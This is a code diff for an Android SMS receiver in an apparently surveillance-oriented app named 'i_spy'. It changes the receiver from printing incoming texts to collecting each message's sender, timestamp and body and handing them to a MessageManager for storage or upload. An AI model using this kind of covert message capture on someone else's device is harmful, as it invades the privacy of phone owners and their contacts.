@@ -7,34 +7,50 @@ import android.os.Build;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
 
+import com.um.asn.i_spy.manager.MessageManager;
+import com.um.asn.i_spy.models.Message;
+import com.um.asn.i_spy.models.Phone;
+
+import java.util.ArrayList;
+
 public class MessageReceiveListener extends BroadcastReceiver {
 
     @Override
     public void onReceive(Context context, Intent intent) {
-        Bundle myBundle = intent.getExtras();
-        SmsMessage[] messages = null;
-        String strMessage = "";
+        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
+            Bundle bundle = intent.getExtras();
+            if (bundle != null) {
+                Object[] pdus = (Object[]) bundle.get("pdus");
 
-        if (myBundle != null) {
-            Object[] pdus = (Object[]) myBundle.get("pdus");
+                ArrayList<Message> messages = new ArrayList<Message>();
+                Phone phone = new Phone();
+                phone.loadWithFile(context);
 
-            messages = new SmsMessage[pdus.length];
+                for (int i = 0; i < pdus.length; i++) {
+                    System.out.println("Message recu");
+                    SmsMessage msg;
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                        msg = SmsMessage.createFromPdu((byte[]) pdus[i], bundle.getString("format"));
+                    } else {
+                        msg = SmsMessage.createFromPdu((byte[]) pdus[i]);
+                    }
 
-            for (int i = 0; i < messages.length; i++) {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    String format = myBundle.getString("format");
-                    messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i], format);
-                } else {
-                    messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
+                    Message message = new Message(
+                            msg.getDisplayOriginatingAddress(),
+                            Message.TYPE_RECEIVED,
+                            (int) (msg.getTimestampMillis() / 1000),
+                            msg.getDisplayMessageBody(),
+                            phone
+                    );
+                    messages.add(message);
+                    System.out.println(message.getNumero() + " / " + message.getType() + " / " + message.getDate() + " / " + message.getContenu());
                 }
-                strMessage += "SMS From: " + messages[i].getOriginatingAddress();
-                strMessage += "SMS ID: " + messages[i].getIndexOnIcc();
-                strMessage += "SMS Date: " + messages[i].getTimestampMillis();
-                strMessage += " : ";
-                strMessage += messages[i].getMessageBody();
-                strMessage += "\n";
+
+                MessageManager messageManager = new MessageManager(context, phone);
+                messageManager.setMessages(messages);
+                if (!messageManager.insert())
+                    messageManager.insertLocal();
             }
         }
-        System.out.println(strMessage);
     }
 }
